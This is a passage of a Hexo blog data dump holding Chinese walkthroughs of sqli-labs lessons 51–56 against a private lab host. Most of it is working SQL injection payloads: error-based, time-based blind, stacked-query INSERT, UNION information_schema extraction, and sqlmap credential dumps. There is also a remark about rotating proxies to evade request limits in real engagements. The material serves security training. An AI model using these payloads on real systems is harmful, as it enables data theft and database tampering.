id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>输入单引号报错</p>\n<p><img src=\"/img/sql/Lesson-51/002.png\" alt=\"002\"></p>\n<p>通过报错可以判断单引号闭合。</p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><p><code>http://10.60.17.35:8082/Less-51/?sort=1&#39;+and+extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-51/003.png\" alt=\"003\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p>中间过程和上一课一样,直接省略</p>\n<a href=\"/2018/11/09/sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入/\" title=\"点击查看Lesson-50\">点击查看Lesson-50</a>\n\n<p><code>http://10.60.17.35:8082/Less-51/?sort=1&#39;+and+extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-51/004.png\" alt=\"004\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p><code>http://10.60.17.35:8082/Less-51/?sort=1&#39;;insert into users(id,username,password)values(101,&#39;huai1&#39;,&#39;dan2&#39;)%23</code></p>\n<p><img src=\"/img/sql/Lesson-51/005.png\" alt=\"005\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql</code></p>\n<p><img src=\"/img/sql/Lesson-51/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-51/007.png\" alt=\"007\"></p>\n<p><code>sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql -D security -T users -C username,password --dump --threads 20</code></p>\n<p><img src=\"/img/sql/Lesson-51/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-51/009.png\" alt=\"009\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-51-GET-基于错误-字符型堆叠注入-OrderBy注入\"><a href=\"#sqli-labs-lession-51-GET-基于错误-字符型堆叠注入-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入\"></a>sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-51/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>输入单引号报错</p>\n<p><img src=\"/img/sql/Lesson-51/002.png\" alt=\"002\"></p>\n<p>通过报错可以判断单引号闭合。</p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><p><code>http://10.60.17.35:8082/Less-51/?sort=1&#39;+and+extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-51/003.png\" alt=\"003\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p>中间过程和上一课一样,直接省略</p>\n<a href=\"/2018/11/09/sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入/\" title=\"点击查看Lesson-50\">点击查看Lesson-50</a>\n\n<p><code>http://10.60.17.35:8082/Less-51/?sort=1&#39;+and+extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-51/004.png\" alt=\"004\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p><code>http://10.60.17.35:8082/Less-51/?sort=1&#39;;insert into users(id,username,password)values(101,&#39;huai1&#39;,&#39;dan2&#39;)%23</code></p>\n<p><img src=\"/img/sql/Lesson-51/005.png\" alt=\"005\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql</code></p>\n<p><img src=\"/img/sql/Lesson-51/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-51/007.png\" alt=\"007\"></p>\n<p><code>sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql -D security -T users -C username,password --dump --threads 20</code></p>\n<p><img src=\"/img/sql/Lesson-51/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-51/009.png\" alt=\"009\"></p>\n"},{"title":"sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入","date":"2018-11-19T02:52:33.000Z","_content":"\n# sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-53/001.png)\n\n## 注入\n\n判断是引号闭合,好像只能利用时间盲注,效率好低啊。\n\n### 时间盲注payload\n\n`http://10.60.17.35:8082/Less-53/?sort=1'+and if(8=length(database()),sleep(3),1)%23`\n\n![002](/img/sql/Lesson-53/002.png)\n\n## 堆叠注入\n\n`http://10.60.17.35:8082/Less-53/?sort=1';create+table+less-53+like+users%23`\n\n![003](/img/sql/Lesson-53/003.png)\n\n## SQLMAP\n\n![004](/img/sql/Lesson-53/004.png)\n\n![005](/img/sql/Lesson-53/005.png)\n\n`sqlmap -u \"http://10.60.17.35:8082/Less-53/?sort=1\" --technique T --dbms mysql --level 2 -v 3 -D security -T users -C username,password --dump`\n\n![006](/img/sql/Lesson-53/006.png)\n\n![007](/img/sql/Lesson-53/007.png)\n\n\n\n\n\n","source":"_posts/sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入.md","raw":"---\ntitle: sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\ndate: 2018-11-19 10:52:33\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-53/001.png)\n\n## 注入\n\n判断是引号闭合,好像只能利用时间盲注,效率好低啊。\n\n### 时间盲注payload\n\n`http://10.60.17.35:8082/Less-53/?sort=1'+and if(8=length(database()),sleep(3),1)%23`\n\n![002](/img/sql/Lesson-53/002.png)\n\n## 堆叠注入\n\n`http://10.60.17.35:8082/Less-53/?sort=1';create+table+less-53+like+users%23`\n\n![003](/img/sql/Lesson-53/003.png)\n\n## SQLMAP\n\n![004](/img/sql/Lesson-53/004.png)\n\n![005](/img/sql/Lesson-53/005.png)\n\n`sqlmap -u \"http://10.60.17.35:8082/Less-53/?sort=1\" --technique T --dbms mysql --level 2 -v 3 -D security -T users -C username,password --dump`\n\n![006](/img/sql/Lesson-53/006.png)\n\n![007](/img/sql/Lesson-53/007.png)\n\n\n\n\n\n","slug":"sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入","published":1,"updated":"2019-06-19T17:23:13.396Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfb006e4dsbr55khupw","content":"<h1 id=\"sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\"><a href=\"#sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\"></a>sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-53/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>判断是引号闭合,好像只能利用时间盲注,效率好低啊。</p>\n<h3 id=\"时间盲注payload\"><a href=\"#时间盲注payload\" class=\"headerlink\" title=\"时间盲注payload\"></a>时间盲注payload</h3><p><code>http://10.60.17.35:8082/Less-53/?sort=1&#39;+and if(8=length(database()),sleep(3),1)%23</code></p>\n<p><img src=\"/img/sql/Lesson-53/002.png\" alt=\"002\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p><code>http://10.60.17.35:8082/Less-53/?sort=1&#39;;create+table+less-53+like+users%23</code></p>\n<p><img src=\"/img/sql/Lesson-53/003.png\" alt=\"003\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><img src=\"/img/sql/Lesson-53/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-53/005.png\" alt=\"005\"></p>\n<p><code>sqlmap -u &quot;http://10.60.17.35:8082/Less-53/?sort=1&quot; --technique T --dbms mysql --level 2 -v 3 -D security -T users -C username,password --dump</code></p>\n<p><img src=\"/img/sql/Lesson-53/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-53/007.png\" alt=\"007\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\"><a href=\"#sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入\"></a>sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-53/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>判断是引号闭合,好像只能利用时间盲注,效率好低啊。</p>\n<h3 id=\"时间盲注payload\"><a href=\"#时间盲注payload\" class=\"headerlink\" title=\"时间盲注payload\"></a>时间盲注payload</h3><p><code>http://10.60.17.35:8082/Less-53/?sort=1&#39;+and if(8=length(database()),sleep(3),1)%23</code></p>\n<p><img src=\"/img/sql/Lesson-53/002.png\" alt=\"002\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p><code>http://10.60.17.35:8082/Less-53/?sort=1&#39;;create+table+less-53+like+users%23</code></p>\n<p><img src=\"/img/sql/Lesson-53/003.png\" alt=\"003\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><img src=\"/img/sql/Lesson-53/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-53/005.png\" alt=\"005\"></p>\n<p><code>sqlmap -u &quot;http://10.60.17.35:8082/Less-53/?sort=1&quot; --technique T --dbms mysql --level 2 -v 3 -D security -T users -C username,password --dump</code></p>\n<p><img src=\"/img/sql/Lesson-53/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-53/007.png\" alt=\"007\"></p>\n"},{"title":"sqli-labs lession-54 GET-Union-变化1-仅允许10次请求","date":"2018-11-21T06:08:44.000Z","_content":"\n# sqli-labs lession-54 GET-Union-变化1-仅允许10次请求\n\n---\n\n## 手注\n\n`http://10.60.17.35:8082/Less-54/index.php?id=1+and+1=2%23`\n\n`http://10.60.17.35:8082/Less-54/index.php?id=1'+and+1=2%23`\n\n通过上述可以判断出是字符型,并且猜测闭合点为单引号成功。\n\n\n\n`http://10.60.17.35:8082/Less-54/index.php?id=1'+order+by+4%23`\n\n通过`order by`猜测字段数\n\n![001](/img/sql/Lesson-54/001.png)\n\n![002](/img/sql/Lesson-54/002.png)\n\n可以发现到这里已经尝试了6次了,实战环境中还需要更换ip代理或浏览器来扩大测试。\n\n`http://10.60.17.35:8082/Less-54/index.php?id=id=-1'+union+select+1,(database()),user()%23`\n\n![003](/img/sql/Lesson-54/003.png)\n\n`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`\n\n![004](/img/sql/Lesson-54/004.png)\n\n`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='vylco793d1'),user()%23`\n\n![005](/img/sql/Lesson-54/005.png)\n\n`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+GROUP_CONCAT(secret_VIY1)from challenges.vylco793d1),user()%23`\n\n![006](/img/sql/Lesson-54/006.png)\n\n提交通过。\n\n![007](/img/sql/Lesson-54/007.png)\n\n\n\n","source":"_posts/sqli-labs-lession-54-GET-Union-变化1-仅允许10次请求.md","raw":"---\ntitle: sqli-labs lession-54 GET-Union-变化1-仅允许10次请求\ndate: 2018-11-21 14:08:44\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-54 GET-Union-变化1-仅允许10次请求\n\n---\n\n## 手注\n\n`http://10.60.17.35:8082/Less-54/index.php?id=1+and+1=2%23`\n\n`http://10.60.17.35:8082/Less-54/index.php?id=1'+and+1=2%23`\n\n通过上述可以判断出是字符型,并且猜测闭合点为单引号成功。\n\n\n\n`http://10.60.17.35:8082/Less-54/index.php?id=1'+order+by+4%23`\n\n通过`order by`猜测字段数\n\n![001](/img/sql/Lesson-54/001.png)\n\n![002](/img/sql/Lesson-54/002.png)\n\n可以发现到这里已经尝试了6次了,实战环境中还需要更换ip代理或浏览器来扩大测试。\n\n`http://10.60.17.35:8082/Less-54/index.php?id=id=-1'+union+select+1,(database()),user()%23`\n\n![003](/img/sql/Lesson-54/003.png)\n\n`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`\n\n![004](/img/sql/Lesson-54/004.png)\n\n`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='vylco793d1'),user()%23`\n\n![005](/img/sql/Lesson-54/005.png)\n\n`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select+GROUP_CONCAT(secret_VIY1)from challenges.vylco793d1),user()%23`\n\n![006](/img/sql/Lesson-54/006.png)\n\n提交通过。\n\n![007](/img/sql/Lesson-54/007.png)\n\n\n\n","slug":"sqli-labs-lession-54-GET-Union-变化1-仅允许10次请求","published":1,"updated":"2019-06-19T17:23:13.396Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfd006h4dsb4ym9xpej","content":"<h1 id=\"sqli-labs-lession-54-GET-Union-变化1-仅允许10次请求\"><a href=\"#sqli-labs-lession-54-GET-Union-变化1-仅允许10次请求\" class=\"headerlink\" title=\"sqli-labs lession-54 GET-Union-变化1-仅允许10次请求\"></a>sqli-labs lession-54 GET-Union-变化1-仅允许10次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p><code>http://10.60.17.35:8082/Less-54/index.php?id=1+and+1=2%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=1&#39;+and+1=2%23</code></p>\n<p>通过上述可以判断出是字符型,并且猜测闭合点为单引号成功。</p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=1&#39;+order+by+4%23</code></p>\n<p>通过<code>order by</code>猜测字段数</p>\n<p><img src=\"/img/sql/Lesson-54/001.png\" alt=\"001\"></p>\n<p><img src=\"/img/sql/Lesson-54/002.png\" alt=\"002\"></p>\n<p>可以发现到这里已经尝试了6次了,实战环境中还需要更换ip代理或浏览器来扩大测试。</p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=id=-1&#39;+union+select+1,(database()),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-54/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=-1&#39;+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-54/004.png\" alt=\"004\"></p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=-1&#39;+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;vylco793d1&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-54/005.png\" alt=\"005\"></p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=-1&#39;+union+select+1,(select+GROUP_CONCAT(secret_VIY1)from challenges.vylco793d1),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-54/006.png\" alt=\"006\"></p>\n<p>提交通过。</p>\n<p><img src=\"/img/sql/Lesson-54/007.png\" alt=\"007\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-54-GET-Union-变化1-仅允许10次请求\"><a href=\"#sqli-labs-lession-54-GET-Union-变化1-仅允许10次请求\" class=\"headerlink\" title=\"sqli-labs lession-54 GET-Union-变化1-仅允许10次请求\"></a>sqli-labs lession-54 GET-Union-变化1-仅允许10次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p><code>http://10.60.17.35:8082/Less-54/index.php?id=1+and+1=2%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=1&#39;+and+1=2%23</code></p>\n<p>通过上述可以判断出是字符型,并且猜测闭合点为单引号成功。</p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=1&#39;+order+by+4%23</code></p>\n<p>通过<code>order by</code>猜测字段数</p>\n<p><img src=\"/img/sql/Lesson-54/001.png\" alt=\"001\"></p>\n<p><img src=\"/img/sql/Lesson-54/002.png\" alt=\"002\"></p>\n<p>可以发现到这里已经尝试了6次了,实战环境中还需要更换ip代理或浏览器来扩大测试。</p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=id=-1&#39;+union+select+1,(database()),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-54/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=-1&#39;+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-54/004.png\" alt=\"004\"></p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=-1&#39;+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;vylco793d1&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-54/005.png\" alt=\"005\"></p>\n<p><code>http://10.60.17.35:8082/Less-54/index.php?id=-1&#39;+union+select+1,(select+GROUP_CONCAT(secret_VIY1)from challenges.vylco793d1),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-54/006.png\" alt=\"006\"></p>\n<p>提交通过。</p>\n<p><img src=\"/img/sql/Lesson-54/007.png\" alt=\"007\"></p>\n"},{"title":"sqli-labs lession-55 GET-Union-变化2-仅允许14次请求","date":"2018-11-28T08:38:44.000Z","_content":"\n# sqli-labs lession-55 GET-Union-变化2-仅允许14次请求\n\n---\n\n## 手注\n\n难点还是快速找到闭合点\n\n`http://10.60.17.35:8082/Less-55/?id=1)and+1=1%23`\n\n`http://10.60.17.35:8082/Less-55/?id=1)and+1=2%23`\n\n`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(database()),user()%23`\n\n![001](/img/sql/Lesson-55/001.png)\n\n`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`\n\n![002](/img/sql/Lesson-55/002.png)\n\n`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)++union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='5uq6lajw6o'),user()%23`\n\n![003](/img/sql/Lesson-55/003.png)\n\n`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+GROUP_CONCAT(secret_Q3R0)from challenges.5uq6lajw6o),user()%23`\n\n![004](/img/sql/Lesson-55/004.png)\n\n提交`mRYe1KdluPEiZrDTZQtW1J7o`成功。\n\n![005](/img/sql/Lesson-55/005.png)\n\n\n\n","source":"_posts/sqli-labs-lession-55-GET-Union-变化2-仅允许14次请求.md","raw":"---\ntitle: sqli-labs lession-55 GET-Union-变化2-仅允许14次请求\ndate: 2018-11-28 16:38:44\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-55 GET-Union-变化2-仅允许14次请求\n\n---\n\n## 手注\n\n难点还是快速找到闭合点\n\n`http://10.60.17.35:8082/Less-55/?id=1)and+1=1%23`\n\n`http://10.60.17.35:8082/Less-55/?id=1)and+1=2%23`\n\n`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(database()),user()%23`\n\n![001](/img/sql/Lesson-55/001.png)\n\n`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`\n\n![002](/img/sql/Lesson-55/002.png)\n\n`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)++union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='5uq6lajw6o'),user()%23`\n\n![003](/img/sql/Lesson-55/003.png)\n\n`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+GROUP_CONCAT(secret_Q3R0)from challenges.5uq6lajw6o),user()%23`\n\n![004](/img/sql/Lesson-55/004.png)\n\n提交`mRYe1KdluPEiZrDTZQtW1J7o`成功。\n\n![005](/img/sql/Lesson-55/005.png)\n\n\n\n","slug":"sqli-labs-lession-55-GET-Union-变化2-仅允许14次请求","published":1,"updated":"2019-06-19T17:23:13.396Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istff006l4dsb8uy24tm0","content":"<h1 id=\"sqli-labs-lession-55-GET-Union-变化2-仅允许14次请求\"><a href=\"#sqli-labs-lession-55-GET-Union-变化2-仅允许14次请求\" class=\"headerlink\" title=\"sqli-labs lession-55 GET-Union-变化2-仅允许14次请求\"></a>sqli-labs lession-55 GET-Union-变化2-仅允许14次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>难点还是快速找到闭合点</p>\n<p><code>http://10.60.17.35:8082/Less-55/?id=1)and+1=1%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-55/?id=1)and+1=2%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(database()),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-55/001.png\" alt=\"001\"></p>\n<p><code>http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-55/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.17.35:8082/Less-55/index.php?id=id=-1)++union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;5uq6lajw6o&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-55/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+GROUP_CONCAT(secret_Q3R0)from challenges.5uq6lajw6o),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-55/004.png\" alt=\"004\"></p>\n<p>提交<code>mRYe1KdluPEiZrDTZQtW1J7o</code>成功。</p>\n<p><img src=\"/img/sql/Lesson-55/005.png\" alt=\"005\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-55-GET-Union-变化2-仅允许14次请求\"><a href=\"#sqli-labs-lession-55-GET-Union-变化2-仅允许14次请求\" class=\"headerlink\" title=\"sqli-labs lession-55 GET-Union-变化2-仅允许14次请求\"></a>sqli-labs lession-55 GET-Union-变化2-仅允许14次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>难点还是快速找到闭合点</p>\n<p><code>http://10.60.17.35:8082/Less-55/?id=1)and+1=1%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-55/?id=1)and+1=2%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(database()),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-55/001.png\" alt=\"001\"></p>\n<p><code>http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-55/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.17.35:8082/Less-55/index.php?id=id=-1)++union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;5uq6lajw6o&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-55/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+GROUP_CONCAT(secret_Q3R0)from challenges.5uq6lajw6o),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-55/004.png\" alt=\"004\"></p>\n<p>提交<code>mRYe1KdluPEiZrDTZQtW1J7o</code>成功。</p>\n<p><img src=\"/img/sql/Lesson-55/005.png\" alt=\"005\"></p>\n"},{"title":"sqli-labs lession-56 GET-Union-变化3-仅允许14次请求","date":"2018-11-28T14:39:03.000Z","_content":"\n# sqli-labs lession-56 GET-Union-变化3-仅允许14次请求\n\n---\n\n## 手注\n\n`http://192.168.75.133:8082/Less-56/?id=1')+order+by+3%23`\n\n![001](/img/sql/Lesson-56/001.png)\n\n`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(database()),user()%23`\n\n![002](/img/sql/Lesson-56/002.png)\n\n`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`\n\n![003](/img/sql/Lesson-56/003.png)\n\n`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='vt405s3q0e'),user()%23`\n\n![004](/img/sql/Lesson-56/004.png)\n\n`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+GROUP_CONCAT(secret_F5AO)from challenges.vt405s3q0e),user()%23`\n\n![005](/img/sql/Lesson-56/005.png)\n\n提交\n\n![006](/img/sql/Lesson-56/006.png)\n\n","source":"_posts/sqli-labs-lession-56-GET-Union-变化3-仅允许14次请求.md","raw":"---\ntitle: sqli-labs lession-56 GET-Union-变化3-仅允许14次请求\ndate: 2018-11-28 22:39:03\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-56 GET-Union-变化3-仅允许14次请求\n\n---\n\n## 手注\n\n`http://192.168.75.133:8082/Less-56/?id=1')+order+by+3%23`\n\n![001](/img/sql/Lesson-56/001.png)\n\n`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(database()),user()%23`\n\n![002](/img/sql/Lesson-56/002.png)\n\n`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`\n\n![003](/img/sql/Lesson-56/003.png)\n\n`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='vt405s3q0e'),user()%23`\n\n![004](/img/sql/Lesson-56/004.png)\n\n`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+GROUP_CONCAT(secret_F5AO)from challenges.vt405s3q0e),user()%23`\n\n![005](/img/sql/Lesson-56/005.png)\n\n提交\n\n![006](/img/sql/Lesson-56/006.png)\n\n","slug":"sqli-labs-lession-56-GET-Union-变化3-仅允许14次请求","published":1,"updated":"2019-06-19T17:23:13.397Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfh006o4dsbt7kkqipk","content":"<h1 id=\"sqli-labs-lession-56-GET-Union-变化3-仅允许14次请求\"><a href=\"#sqli-labs-lession-56-GET-Union-变化3-仅允许14次请求\" class=\"headerlink\" title=\"sqli-labs lession-56 GET-Union-变化3-仅允许14次请求\"></a>sqli-labs 